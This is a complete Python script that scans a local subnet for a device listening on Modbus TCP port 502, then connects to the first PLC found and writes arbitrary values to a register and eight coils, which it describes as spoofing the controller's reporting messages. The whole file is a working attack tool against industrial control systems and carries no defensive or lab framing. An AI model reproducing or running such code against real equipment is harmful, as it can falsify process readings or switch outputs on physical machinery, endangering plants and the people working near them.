import socket
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException

# Function to scan the local subnet for the PLC
def find_plc_ip():
    subnet = "192.168.9."  # Adjust this to your IP range if needed
    port = 502  # Default Modbus TCP port

    print("Scanning for PLC on the subnet...")
    for i in range(1, 255):  # Scanning the full subnet range
        ip = f"{subnet}{i}"
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                result = s.connect_ex((ip, port))
                if result == 0:  # Port is open
                    print(f"PLC found at IP: {ip}")
                    return ip
        except Exception as e:
            pass
    print("No PLC found on the subnet.")
    return None

# Function to spoof reporting messages
def spoof_reporting_messages(plc_ip):
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print("Unable to connect to the PLC.")
        return

    try:
        print(f"Connected to PLC at {plc_ip}. Spoofing reporting messages...")
        
        # Example: Spoof input register (analog data) values
        spoofed_analog_value = 999  # Arbitrary spoofed value
        client.write_register(0, spoofed_analog_value)  # %IW0.0 corresponds to address 0
        
        # Example: Spoof digital input (%I) values
        spoofed_digital_value = 0b10101010  # Spoofing alternating on/off signals
        client.write_coils(0, [bool(int(b)) for b in bin(spoofed_digital_value)[2:].zfill(8)])

        print(f"Successfully spoofed reporting messages.")
    except ModbusIOException as e:
        print("Modbus communication error:", e)
    except Exception as e:
        print("An error occurred during spoofing:", e)
    finally:
        client.close()
        print("Disconnected from PLC.")

def main():
    # Step 1: Find PLC IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("Exiting script: PLC not found.")
        return

    # Step 2: Spoof reporting messages
    spoof_reporting_messages(plc_ip)

if __name__ == "__main__":
    main()